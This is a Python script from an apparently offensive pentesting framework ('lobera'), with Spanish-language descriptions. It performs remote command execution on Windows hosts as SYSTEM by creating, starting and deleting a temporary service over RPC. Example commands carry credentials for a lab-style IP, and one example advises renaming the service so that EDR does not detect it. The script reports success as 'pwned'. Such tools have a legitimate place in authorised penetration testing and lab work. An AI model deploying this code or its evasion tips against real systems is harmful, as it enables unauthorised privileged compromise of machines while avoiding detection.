# scripts/rpc/attack/exec-service.py

import time
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

try:
    from modules.rpc import RPCModule
    _RPC_OK = True
except ImportError:
    _RPC_OK = False


class Script(BaseScript):
    name        = "exec-service"
    protocol    = "rpc"
    category    = "attack"
    description = (
        "Ejecución remota de comandos vía SCM (Service Control Manager): "
        "crea un servicio temporal, lo arranca, espera y lo borra. "
        "El proceso corre como SYSTEM. Sin retorno de output directo — "
        "redirige a un fichero y descárgalo vía SMB."
    )

    EXAMPLES = [
        {
            "flag":  "--command",
            "desc":  "Comando a ejecutar (corre como SYSTEM, sin output directo)",
            "good":  r"lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command 'cmd.exe /c whoami > C:\Windows\Temp\out.txt'",
            "bad":   "lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command 'whoami'  [sin redirección no hay output]",
        },
        {
            "flag":  "--svc-name",
            "desc":  "Nombre del servicio temporal (default: LobSvc)",
            "good":  "lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command '...' --svc-name MySvc123",
            "bad":   "lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command '...'  [LobSvc puede ser detectado por EDR]",
        },
        {
            "flag":  "--wait",
            "desc":  "Segundos de espera antes de borrar el servicio (default: 3)",
            "good":  "lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command '...' --wait 5",
            "bad":   "lobera.py rpc --script=exec-service -t 10.129.1.5 -u admin -p 'Pass1' --command '...' --wait 0  [sin espera el cmd puede no completarse]",
        },
    ]

    def run(self, **kwargs):
        if not _RPC_OK:
            print_result("RPC", str(self.target.ip), "fail", "modules/rpc.py no disponible"); return False

        command  = kwargs.get("command")
        svc_name = kwargs.get("svc_name", "LobSvc")
        wait_sec = int(kwargs.get("wait", 3))

        if not command:
            console.print("[red]--command es obligatorio[/red]")
            return False

        rpc = RPCModule(self.target, self.creds)
        if not rpc.connect(): return False
        try:
            print_result("RPC", str(self.target.ip), "info",
                         "Creando servicio '{}' con comando: {}".format(svc_name, command))

            svc_h = rpc.create_service(svc_name, svc_name, command)
            if not svc_h:
                return False

            ok = rpc.start_service(svc_name)
            if ok:
                console.print("[dim]  Esperando {} segundos para completar ejecución...[/dim]".format(wait_sec))
                time.sleep(wait_sec)

            rpc.stop_service(svc_name)
            rpc.delete_service(svc_name)

            if ok:
                print_result("RPC", str(self.target.ip), "pwned",
                             "Comando ejecutado como SYSTEM")
                console.print(
                    "[dim]→ Si redirigiste a fichero, descárgalo con:\n"
                    "  lobera.py smb --script=spider -t {} -u {} [creds] "
                    "--share C$ --keywords out.txt[/dim]".format(
                        self.target.ip, self.creds.user or "admin")
                )
            return ok
        finally:
            rpc.disconnect()
